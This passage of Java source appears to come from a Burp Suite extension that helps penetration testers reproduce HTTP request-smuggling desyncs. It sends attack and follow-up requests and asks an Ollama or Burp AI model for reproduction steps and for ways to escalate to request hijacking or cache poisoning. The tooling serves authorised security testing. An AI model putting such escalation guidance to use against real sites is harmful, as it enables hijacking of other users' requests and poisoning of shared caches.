        final String providerLabel = useOllama ? "Ollama (" + model + ")" : "Burp AI";

        aiButton.setEnabled(false);
        if (useOllama) {
            aiArea.setText("[connecting to " + endpoint + " — " + model + "]\n"
                    + "[sending request + PoC, then streaming the model's response below]\n"
                    + "[note: a thinking model shows its <think> reasoning first, then the answer]\n\n");
        } else {
            aiArea.setText("[asking Burp AI — response appears when complete]\n\n");
        }
        aiArea.setCaretPosition(aiArea.getDocument().getLength());
        startElapsedTimer(start, providerLabel);

        new SwingWorker<String, String>() {
            @Override
            protected String doInBackground() {
                try {
                    if (useOllama) {
                        return OllamaClient.chatStream(endpoint, model, system, user, 600,
                                token -> publish(token));
                    }
                    PromptResponse response = api.ai().prompt().execute(
                            PromptOptions.promptOptions().withTemperature(0.2d),
                            Message.systemMessage(system),
                            Message.userMessage(user));
                    return response == null ? "(no response)" : response.content();
                } catch (Throwable t) {
                    String detail = t.getMessage() == null ? t.toString() : t.getMessage();
                    if (useOllama) {
                        return "\n\nOllama request failed: " + detail + "\n\n"
                                + "Checklist:\n"
                                + "  - Is Ollama running?            ollama serve\n"
                                + "  - Is the model pulled?          ollama pull " + model + "\n"
                                + "  - Is the endpoint reachable?     " + endpoint + "\n"
                                + "  - List installed models:        ollama list";
                    }
                    return "AI request failed: " + detail;
                }
            }

            @Override
            protected void process(List<String> chunks) {
                for (String chunk : chunks) {
                    aiArea.append(chunk);
                }
                aiArea.setCaretPosition(aiArea.getDocument().getLength());
            }

            @Override
            protected void done() {
                stopElapsedTimer();
                long secs = (System.currentTimeMillis() - start) / 1000;
                try {
                    String content = get();
                    if (useOllama) {
                        if (content != null && content.contains("Ollama request failed")) {
                            aiArea.append(content);
                            setStatus("Ollama request failed.");
                        } else {
                            aiArea.append("\n\n[done in " + secs + "s]");
                            setStatus("Ollama finished in " + secs + "s.");
                        }
                    } else {
                        aiArea.setText(content == null || content.isEmpty() ? "(empty response)" : content);
                        setStatus("Burp AI responded in " + secs + "s.");
                    }
                    aiArea.setCaretPosition(aiArea.getDocument().getLength());
                } catch (Exception ex) {
                    aiArea.append("\n\nRequest failed: " + ex.getMessage());
                    setStatus("AI request failed.");
                } finally {
                    aiButton.setEnabled(true);
                }
            }
        }.execute();
    }

    private void startElapsedTimer(long start, String providerLabel) {
        stopElapsedTimer();
        elapsedTimer = new Timer(1000, e -> {
            long secs = (System.currentTimeMillis() - start) / 1000;
            statusLabel.setText(providerLabel + " working... " + secs + "s elapsed");
        });
        elapsedTimer.setInitialDelay(0);
        elapsedTimer.start();
    }

    private void stopElapsedTimer() {
        if (elapsedTimer != null) {
            elapsedTimer.stop();
            elapsedTimer = null;
        }
    }

    private static String systemPrompt(DesyncRepro.Type type) {
        return "You are an expert in HTTP request smuggling and desync attacks, familiar with "
                + "PortSwigger's request-smuggling, browser-powered desync and 'HTTP/1.1 must die' "
                + "research. A penetration tester is trying to confirm and manually replicate a "
                + type.label + " desync that an automated scanner flagged. Be precise, practical and "
                + "concise, and keep all guidance specific to a " + type.label + " desync (do NOT "
                + "describe a different desync class). Structure your answer as:\n"
                + "1. A short plain-English explanation of what " + type.label + " means for THIS request "
                + "(which parser is the front-end, which is the back-end, and why they disagree).\n"
                + "2. Numbered, exact Burp Repeater steps to reproduce it, referencing 'Send group in "
                + "sequence (single connection)' and whether 'Update Content-Length' must be on or off "
                + "for " + type.label + ".\n"
                + "3. The most common reasons manual replication fails and how to fix each (include "
                + "expired session/cookie as a candidate).\n"
                + "4. How to escalate it to concrete impact (e.g. request hijacking, response queue "
                + "poisoning, cache poisoning), with appropriate caution.\n"
                + "Only reference endpoints/headers present in the supplied request. Do not fabricate "
                + "responses. If something cannot be determined from the data, say so.";
    }

    private String buildUserPrompt() {
        StringBuilder sb = new StringBuilder();
        sb.append("Target: ").append(serviceDescription()).append('\n');
        sb.append("Desync class: ").append(repro.type.label).append('\n');
        if (repro.type == DesyncRepro.Type.CL_0) {
            sb.append("CL.0 Content-Length permutation: ").append(repro.technique).append('\n');
        }
        sb.append("Repeater 'Update Content-Length' for this PoC: ")
                .append(repro.keepUpdateContentLength ? "ON" : "OFF").append('\n');
        sb.append("Smuggled request line used in the PoC: ").append(repro.smuggledLine).append('\n');
        boolean hasCookie = cookieField.getText() != null && !cookieField.getText().trim().isEmpty();
        sb.append("Session cookie present: ").append(hasCookie ? "yes" : "no").append('\n');
        sb.append("IMPORTANT: replication only works with a VALID session. If the Cookie above is "
                + "expired the desync will look non-reproducible even on a vulnerable target — flag this "
                + "as a likely failure cause and tell the tester to re-validate the session.\n\n");
        sb.append("ORIGINAL REQUEST:\n");
        sb.append("```\n").append(truncate(decode(workingRequest), 3500)).append("\n```\n\n");
        if (responseBytes != null && responseBytes.length > 0) {
            sb.append("ORIGINAL RESPONSE (headers + start of body):\n");
            sb.append("```\n").append(truncate(decode(responseBytes), 1500)).append("\n```\n\n");
        }
        sb.append("GENERATED ").append(repro.type.label)
                .append(" ATTACK REQUEST (sent first on the connection):\n");
        sb.append("```\n").append(truncate(attackArea.getText(), 3500)).append("\n```\n\n");
        sb.append("GENERATED FOLLOW-UP REQUEST (sent second on the same connection):\n");
        sb.append("```\n").append(truncate(followUpArea.getText(), 3500)).append("\n```\n");
        return sb.toString();
    }

    private String serviceDescription() {
        try {
            if (service == null) {
                return "(unknown)";
            }
            return (service.secure() ? "https://" : "http://") + service.host() + ":" + service.port();
        } catch (Throwable t) {
            return "(unknown)";
        }
    }

    private static String decode(byte[] bytes) {
        return bytes == null ? "" : new String(bytes, StandardCharsets.ISO_8859_1);
    }

    private static String truncate(String s, int max) {
        if (s == null) {
            return "";
        }
        if (s.length() <= max) {
            return s;
        }
        return s.substring(0, max) + "\n...[truncated]...";
    }

    private void setStatus(String text) {
        SwingUtilities.invokeLater(() -> statusLabel.setText(text == null ? " " : text));
    }

    private static JSplitPane requestResponseSplit(JTextArea request, JTextArea response) {
        JSplitPane split = new JSplitPane(
                JSplitPane.VERTICAL_SPLIT, new JScrollPane(request), new JScrollPane(response));
        split.setResizeWeight(0.55);
        split.setDividerLocation(280);
        return split;
    }

    private void clearCapturedResponses() {
        SwingUtilities.invokeLater(() -> {
            attackResponseArea.setText("Waiting for test...");
            followUpResponseArea.setText("Waiting for test...");
        });
    }

    private void displayCapturedResponses(Resp baseline, Resp attack, Resp followUp) {
        SwingUtilities.invokeLater(() -> {
            attackResponseArea.setText(formatResponseForTab("Attack response (request #1 on the pair connection)", attack));
            if (baseline != null && followUp != null && !followUp.failed() && !similar(followUp, baseline)) {
                followUpResponseArea.setText(
                        formatResponseForTab("Baseline follow-up (solo connection)", baseline)
                                + "\n\n"
                                + "========================================\n\n"
                                + formatResponseForTab(
                                        "Poisoned follow-up (after attack on same connection)", followUp));
            } else {
                followUpResponseArea.setText(
                        formatResponseForTab("Follow-up response (request #2 on the pair connection)", followUp));
            }
        });
    }

    private static String formatResponseForTab(String title, Resp r) {
        if (r == null || r.failed()) {
            return title + "\n(no response or request failed)\n";
        }
        return title + "\nHTTP status: " + r.getStatus() + "\nBody size: " + respLen(r) + " bytes\n"
                + "----------------------------------------\n"
                + respString(r);
    }

    private static JTextArea monospace() {
        JTextArea a = new JTextArea(16, 80);
        a.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
        a.setLineWrap(false);
        return a;
    }

    private static JTextArea readOnly() {
        JTextArea a = new JTextArea(16, 80);
        a.setEditable(false);
        a.setLineWrap(true);
        a.setWrapStyleWord(true);
        return a;
    }
}
